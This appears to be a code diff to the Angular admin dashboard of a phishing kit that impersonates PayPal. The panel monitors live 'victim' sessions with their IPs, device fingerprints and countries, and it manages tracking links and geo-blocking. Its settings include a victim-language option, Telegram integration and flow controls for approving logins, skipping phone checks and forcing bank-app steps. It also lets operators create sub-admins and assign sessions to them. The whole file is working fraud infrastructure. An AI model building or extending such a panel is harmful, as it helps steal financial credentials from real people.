@@ -60,7 +60,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                  <!-- Level 2: Actual Admin Login (PayPal Style) -->
                  <div class="pp-card max-w-[400px] animate-fade-in">
                     <div class="flex justify-center mb-8">
-                         <!-- Simple Text Logo for Admin -->
                          <h1 class="text-3xl font-bold text-pp-navy tracking-tighter">PayPal <span class="text-pp-blue">Admin</span></h1>
                     </div>
                     <h2 class="text-xl font-bold text-center mb-6">Security Console</h2>
@@ -93,7 +92,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
               }
            </div>
            
-           <!-- Mobile Nav (Horizontal) -->
            <nav class="flex lg:flex-col items-center lg:items-stretch gap-2 lg:gap-0 lg:py-6">
                <a (click)="activeTab.set('live')" [class.bg-[#ffffff10]]="activeTab() === 'live'" class="flex items-center gap-2 lg:gap-4 px-3 lg:px-6 py-2 lg:py-3 text-sm font-medium text-white/80 hover:bg-[#ffffff10] hover:text-white cursor-pointer transition-colors rounded-lg lg:rounded-none lg:border-l-4 border-transparent" [class.border-l-pp-success]="activeTab() === 'live'">
                    <span class="material-icons text-[20px]">radar</span>
@@ -144,7 +142,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
       <!-- MAIN CONTENT -->
       <main class="flex-1 flex flex-col h-[calc(100dvh-64px)] lg:h-[100dvh] relative bg-pp-bg dark:bg-slate-900 overflow-hidden">
          
-         <!-- Impersonation Banner -->
          @if (auth.currentUser()?.isImpersonated) {
              <div class="bg-orange-500 text-white text-xs font-bold px-4 py-2 flex justify-between items-center z-50 shadow-md">
                  <div class="flex items-center gap-2">
@@ -157,7 +154,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
              </div>
          }
 
-         <!-- Top Bar (Desktop Only) -->
          <header class="hidden lg:flex h-16 bg-white dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700 items-center justify-between px-6 shrink-0 z-20 shadow-sm">
              <div class="flex items-center gap-2">
                  <h1 class="text-lg font-bold text-pp-navy dark:text-white">
@@ -180,15 +176,12 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
              </div>
          </header>
 
-         <!-- Content Area -->
          <div class="flex-1 overflow-hidden relative">
             
             @switch (activeTab()) {
                 
-                <!-- LIVE MONITOR -->
                 @case ('live') {
                     <div class="flex flex-col lg:flex-row h-full">
-                        <!-- List Column -->
                         <div class="lg:w-[350px] bg-white dark:bg-slate-800 border-b lg:border-b-0 lg:border-r border-slate-200 dark:border-slate-700 flex flex-col shrink-0 h-[300px] lg:h-full">
                              <div class="p-4 border-b border-slate-100 dark:border-slate-700 bg-slate-50/90 dark:bg-slate-900/90 flex justify-between items-center shrink-0">
                                  <h3 class="font-bold text-base text-pp-navy dark:text-white">{{ 'ACTIVE_SESSIONS' | translate }}</h3>
@@ -200,7 +193,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                  </div>
                              </div>
 
-                             <!-- Session List -->
                              <div class="flex-1 overflow-y-auto p-2 space-y-2 dark:bg-slate-800">
                                  @for(session of state.activeSessions(); track session.id) {
                                      <div (click)="selectSession(session)" class="p-3 rounded-[12px] cursor-pointer transition-all border border-transparent group relative"
@@ -217,16 +209,13 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                          <div class="flex flex-col gap-0.5">
                                              <div class="flex items-center gap-2">
                                                 @if(getDeviceImage(session.fingerprint?.userAgent)) {
-                                                    <img [src]="getDeviceImage(session.fingerprint?.userAgent)" class="h-3 w-3 object-contain dark:invert opacity-70" title="{{session.fingerprint?.platform}}">
+                                                    <img [src]="getDeviceImage(session.fingerprint?.userAgent)" class="h-3 w-3 object-contain dark:invert opacity-70">
                                                 } @else {
-                                                    <span class="material-icons text-slate-400 text-[14px]" title="{{session.fingerprint?.platform}}">{{ getDeviceIcon(session.fingerprint?.userAgent) }}</span>
+                                                    <span class="material-icons text-slate-400 text-[14px]">{{ getDeviceIcon(session.fingerprint?.userAgent) }}</span>
                                                 }
                                                 <span class="font-bold text-pp-navy dark:text-white font-mono text-xs">{{ session.ip || session.fingerprint?.ip || session.id }}</span>
                                                 @if(session.data?.ipCountry) {
-                                                    <img [src]="getFlagUrl(session.data.ipCountry)" class="h-3 w-auto rounded-[2px]" title="{{session.data.ipCountry}}">
-                                                }
-                                                @if(session.data?.isRecurring) {
-                                                    <span class="material-icons text-[12px] text-amber-600 bg-amber-100 rounded-full p-0.5" title="Recurring User">history</span>
+                                                    <img [src]="getFlagUrl(session.data.ipCountry)" class="h-3 w-auto rounded-[2px]">
                                                 }
                                              </div>
                                              <div class="flex items-center justify-between w-full">
@@ -283,7 +272,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                              </div>
                         </div>
 
-                        <!-- Details Column -->
                         <div class="flex-1 flex flex-col h-full overflow-hidden bg-[#F9FAFB] dark:bg-slate-900 relative">
                              @if(monitoredSession()) {
                                  <ng-container *ngTemplateOutlet="sessionDetailView; context: {session: monitoredSession(), isHistory: false}"></ng-container>
@@ -298,7 +286,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                     </div>
                 }
 
-                <!-- LINKS TAB -->
                 @case ('links') {
                     <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden h-full flex flex-col p-6">
                         <div class="flex justify-between items-center mb-6">
@@ -353,24 +340,14 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                             </td>
                                         </tr>
                                     }
-                                    @if(linkList().length === 0) {
-                                        <tr>
-                                            <td colspan="7" class="px-6 py-8 text-center text-slate-400 text-xs">
-                                                No additional tracking links generated.
-                                            </td>
-                                        </tr>
-                                    }
                                 </tbody>
                             </table>
                         </div>
                     </div>
                 }
 
-                <!-- SYSTEM TAB -->
                 @case ('system') {
                     <div class="h-full overflow-y-auto p-6 space-y-6">
-
-                        <!-- KPI Stats -->
                         <div class="grid grid-cols-4 gap-4">
                             <div class="bg-white dark:bg-slate-800 p-4 rounded-xl border border-slate-100 dark:border-slate-700 shadow-sm">
                                 <p class="text-xs font-bold text-slate-400 uppercase tracking-wider">{{ 'TOTAL_SESSIONS' | translate }}</p>
@@ -390,7 +367,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                             </div>
                         </div>
 
-                        <!-- Gate Configuration -->
                         <div class="bg-white dark:bg-slate-800 rounded-xl shadow-sm border border-slate-100 dark:border-slate-700 p-6">
                             <h3 class="font-bold text-sm text-pp-navy dark:text-white uppercase tracking-wider mb-4 border-b border-slate-100 dark:border-slate-700 pb-2">{{ 'ACCESS_CONTROL' | translate }}</h3>
                             <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
@@ -410,9 +386,7 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                             </div>
                         </div>
 
-                        <!-- Logs -->
                         <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 h-[400px]">
-                            <!-- Server Logs -->
                             <div class="bg-[#1e1e1e] rounded-xl overflow-hidden flex flex-col shadow-lg border border-slate-700">
                                 <div class="bg-[#2d2d2d] px-4 py-2 border-b border-slate-600 flex justify-between items-center">
                                     <span class="text-xs font-bold text-slate-300 uppercase flex items-center gap-2">
@@ -430,7 +404,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                 </div>
                             </div>
 
-                            <!-- Audit Logs -->
                             <div class="bg-white dark:bg-slate-800 rounded-xl overflow-hidden flex flex-col shadow-sm border border-slate-100 dark:border-slate-700">
                                 <div class="px-6 py-4 border-b border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-900/50">
                                     <h3 class="font-bold text-pp-navy dark:text-white">{{ 'AUDIT_LOG' | translate }}</h3>
@@ -464,7 +437,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                     </div>
                 }
 
-                <!-- USERS TAB -->
                 @case ('users') {
                     <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden h-full flex flex-col p-6">
                         <div class="flex justify-between items-center mb-6">
@@ -520,7 +492,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                     </div>
                 }
 
-                <!-- HISTORY TAB -->
                 @case ('history') {
                     <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden h-full flex flex-col">
                         <div class="px-6 py-4 border-b border-slate-100 dark:border-slate-700 bg-slate-50/90 dark:bg-slate-900/90 flex flex-col md:flex-row gap-4 items-center justify-between shrink-0">
@@ -569,12 +540,10 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                     </div>
                 }
 
-                <!-- SETTINGS TAB -->
                 @case ('settings') {
                     <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-y-auto h-full p-8 animate-fade-in">
                          <h2 class="font-bold text-xl mb-6 text-pp-navy dark:text-white">{{ 'SYSTEM' | translate }} Configuration</h2>
 
-                         <!-- Flow Customization -->
                          <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
                              <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'TRAFFIC_FLOW' | translate }}</h3>
                              <div class="space-y-4">
@@ -627,7 +596,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                              </div>
                          </div>
 
-                         <!-- Geo-Blocking (NEW) -->
                          <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
                              <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'GEO_BLOCKING' | translate }}</h3>
 
@@ -670,7 +638,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                      </div>
                                  </div>
 
-                                 <!-- Victim Language -->
                                  <div>
                                      <label class="block text-sm font-bold text-pp-navy dark:text-white mb-2">{{ 'VICTIM_LANGUAGE' | translate }}</label>
                                      <select [(ngModel)]="flowSettings.defaultLang" class="pp-input dark:bg-slate-700 dark:text-white dark:border-slate-600">
@@ -686,7 +653,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                              </div>
                          </div>
 
-                         <!-- Appearance -->
                          <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
                              <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'APPEARANCE' | translate }}</h3>
 
@@ -722,7 +688,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                              </div>
                          </div>
 
-                         <!-- Telegram -->
                          <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
                              <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'TELEGRAM_INTEGRATION' | translate }}</h3>
                              @if(!isSettingsConfigured()) {
@@ -756,7 +721,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                              }
                          </div>
 
-                         <!-- Security -->
                          <div>
                              <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'ADMIN_SECURITY' | translate }}</h3>
                              <div class="space-y-4">
@@ -780,7 +744,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
          </div>
       </main>
 
-      <!-- Admin Detail Side Panel (Hypervisor) -->
       @if (userPanelOpen()) {
            <div class="fixed inset-0 z-50 flex justify-end">
                <div class="absolute inset-0 bg-black/20 backdrop-blur-sm transition-opacity" (click)="closeUserPanel()"></div>
@@ -796,7 +759,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                    </div>
 
                    <div class="flex-1 overflow-y-auto p-6 space-y-8">
-                       <!-- Actions -->
                        @if(selectedAdmin()?.id !== auth.currentUser()?.id) {
                            <div class="grid grid-cols-2 gap-4">
                                <button (click)="impersonateUser(selectedAdmin())" class="bg-pp-navy text-white py-3 rounded-lg font-bold text-sm hover:bg-pp-blue transition-colors flex items-center justify-center gap-2 shadow-lg">
@@ -808,7 +770,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                            </div>
                        }
 
-                       <!-- Tracking Links -->
                        <div>
                            <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4 border-b border-slate-100 dark:border-slate-700 pb-2">Tracking Links</h3>
                            <div class="space-y-2">
@@ -827,7 +788,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                            </div>
                        </div>
 
-                       <!-- Flow Configuration -->
                        <div>
                            <div class="flex justify-between items-center mb-4 border-b border-slate-100 dark:border-slate-700 pb-2">
                                <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider">Flow Control</h3>
@@ -845,7 +805,6 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                        <input type="checkbox" [(ngModel)]="selectedAdminSettings.skipPhone" class="w-5 h-5 text-pp-blue rounded focus:ring-pp-blue border-gray-300">
                                    </label>
 
-                                   <!-- New Geo-Blocking for User Panel -->
                                    <div class="pt-4 border-t border-slate-100 dark:border-slate-700">
                                        <label class="block text-xs font-bold text-slate-400 uppercase mb-2">Geo-Blocking (Whitelist)</label>
                                        <div class="flex flex-wrap gap-1 mb-2">
@@ -888,7 +847,119 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
            </div>
       }
 
-      <!-- Reusable Session Detail Template -->
+      @if (userModalOpen()) {
+           <div class="fixed inset-0 z-50 flex items-center justify-center p-4">
+               <div class="absolute inset-0 bg-black/40 backdrop-blur-sm transition-opacity" (click)="closeUserModal()"></div>
+               <div class="relative bg-white dark:bg-slate-800 rounded-2xl shadow-2xl max-w-md w-full overflow-hidden animate-fade-in">
+                   <div class="p-6 border-b border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-900/50 flex justify-between items-center">
+                       <h3 class="font-bold text-lg text-pp-navy dark:text-white">Create Admin User</h3>
+                       <button (click)="closeUserModal()" class="text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 transition-colors">
+                           <span class="material-icons">close</span>
+                       </button>
+                   </div>
+                   <div class="p-6 space-y-4">
+                       <div class="pp-input-group mb-0">
+                           <input type="text" [(ngModel)]="newUser.username" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                           <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Username</label>
+                       </div>
+                       <div class="pp-input-group mb-0">
+                           <input type="password" [(ngModel)]="newUser.password" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                           <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Password</label>
+                       </div>
+                       <div class="grid grid-cols-2 gap-4">
+                           <div class="pp-input-group mb-0">
+                               <select [(ngModel)]="newUser.role" class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                   <option value="admin">Admin</option>
+                                   <option value="hypervisor">Hypervisor</option>
+                               </select>
+                               <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Role</label>
+                           </div>
+                           <div class="pp-input-group mb-0">
+                               <input type="number" [(ngModel)]="newUser.maxLinks" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                               <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Max Links</label>
+                           </div>
+                       </div>
+                       <div class="pt-4 border-t border-slate-100 dark:border-slate-700">
+                           <p class="text-xs font-bold text-slate-400 uppercase mb-3">Default Flow Settings</p>
+                           <div class="space-y-2">
+                               <label class="flex items-center gap-2 cursor-pointer">
+                                   <input type="checkbox" [(ngModel)]="newUser.flow.autoApproveLogin" class="rounded text-pp-blue focus:ring-pp-blue border-slate-300">
+                                   <span class="text-sm text-pp-navy dark:text-white">Auto-Approve Login</span>
+                               </label>
+                               <label class="flex items-center gap-2 cursor-pointer">
+                                   <input type="checkbox" [(ngModel)]="newUser.flow.skipPhone" class="rounded text-pp-blue focus:ring-pp-blue border-slate-300">
+                                   <span class="text-sm text-pp-navy dark:text-white">Skip Phone Verification</span>
+                               </label>
+                               <label class="flex items-center gap-2 cursor-pointer">
+                                   <input type="checkbox" [(ngModel)]="newUser.flow.forceBankApp" class="rounded text-pp-blue focus:ring-pp-blue border-slate-300">
+                                   <span class="text-sm text-pp-navy dark:text-white">Force Bank App</span>
+                               </label>
+                           </div>
+                       </div>
+                   </div>
+                   <div class="p-4 border-t border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-900/50 flex justify-end gap-3">
+                       <button (click)="closeUserModal()" class="px-4 py-2 text-slate-500 font-bold hover:bg-slate-200 dark:hover:bg-slate-700 rounded-lg transition-colors text-sm">Cancel</button>
+                       <button (click)="submitCreateUser()" class="pp-btn w-auto px-6 py-2 text-sm">Create User</button>
+                   </div>
+               </div>
+           </div>
+      }
+
+      @if (assignModalOpen()) {
+           <div class="fixed inset-0 z-50 flex items-center justify-center p-4">
+               <div class="absolute inset-0 bg-black/40 backdrop-blur-sm transition-opacity" (click)="assignModalOpen.set(false)"></div>
+               <div class="relative bg-white dark:bg-slate-800 rounded-2xl shadow-2xl max-w-md w-full overflow-hidden animate-fade-in">
+                   <div class="p-6 border-b border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-900/50 flex justify-between items-center">
+                       <h3 class="font-bold text-lg text-pp-navy dark:text-white">Assign Session</h3>
+                       <button (click)="assignModalOpen.set(false)" class="text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 transition-colors">
+                           <span class="material-icons">close</span>
+                       </button>
+                   </div>
+                   <div class="p-6 space-y-4">
+                       <div class="pp-input-group mb-0 relative">
+                           <span class="material-icons absolute right-3 top-3 text-slate-400">search</span>
+                           <input type="text" [ngModel]="assignSearch()" (ngModelChange)="assignSearch.set($event)" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                           <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Search Admin</label>
+                       </div>
+
+                       <div class="max-h-[300px] overflow-y-auto space-y-2">
+                           @for(admin of filteredAdmins(); track admin.id) {
+                               <div class="flex items-center justify-between p-3 rounded-lg border border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
+                                   <div>
+                                       <p class="font-bold text-sm text-pp-navy dark:text-white">{{ admin.username }}</p>
+                                       <p class="text-[10px] text-slate-400 uppercase">{{ admin.role }}</p>
+                                   </div>
+                                   <button (click)="submitAssignment(admin.id)" class="text-xs font-bold bg-pp-blue text-white px-3 py-1.5 rounded hover:bg-[#005ea6] transition-colors">
+                                       Select
+                                   </button>
+                               </div>
+                           }
+                           @if(filteredAdmins().length === 0) {
+                               <p class="text-center text-sm text-slate-400 py-4">No admins found.</p>
+                           }
+                       </div>
+                   </div>
+               </div>
+           </div>
+      }
+
+      @if (historyPanelOpen()) {
+           <div class="fixed inset-0 z-50 flex justify-end">
+               <div class="absolute inset-0 bg-black/20 backdrop-blur-sm transition-opacity" (click)="closeHistory()"></div>
+               <div class="relative w-full max-w-[90vw] md:max-w-[1200px] bg-white dark:bg-slate-800 h-full shadow-2xl flex flex-col animate-slide-in-right">
+                   <div class="p-6 border-b border-slate-100 dark:border-slate-700 flex justify-between items-center bg-slate-50/50 dark:bg-slate-800/95">
+                       <h2 class="font-bold text-xl text-pp-navy dark:text-white">Session History Details</h2>
+                       <button (click)="closeHistory()" class="p-2 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-500 dark:text-slate-400 rounded-full transition-colors">
+                           <span class="material-icons">close</span>
+                       </button>
+                   </div>
+                   <div class="flex-1 overflow-y-auto bg-[#F9FAFB] dark:bg-slate-900 flex flex-col">
+                        <ng-container *ngTemplateOutlet="sessionDetailView; context: {session: selectedHistorySession(), isHistory: true}"></ng-container>
+                   </div>
+               </div>
+           </div>
+      }
+
       <ng-template #sessionDetailView let-session="session" let-isHistory="isHistory">
             <div class="p-6 border-b border-slate-100 dark:border-slate-700 flex justify-between items-center bg-white/50 dark:bg-slate-800/90 shrink-0">
                 <div>
@@ -1070,6 +1141,7 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                 </div>
             }
       </ng-template>
+      }
     </div>
   `,
   styles: [`
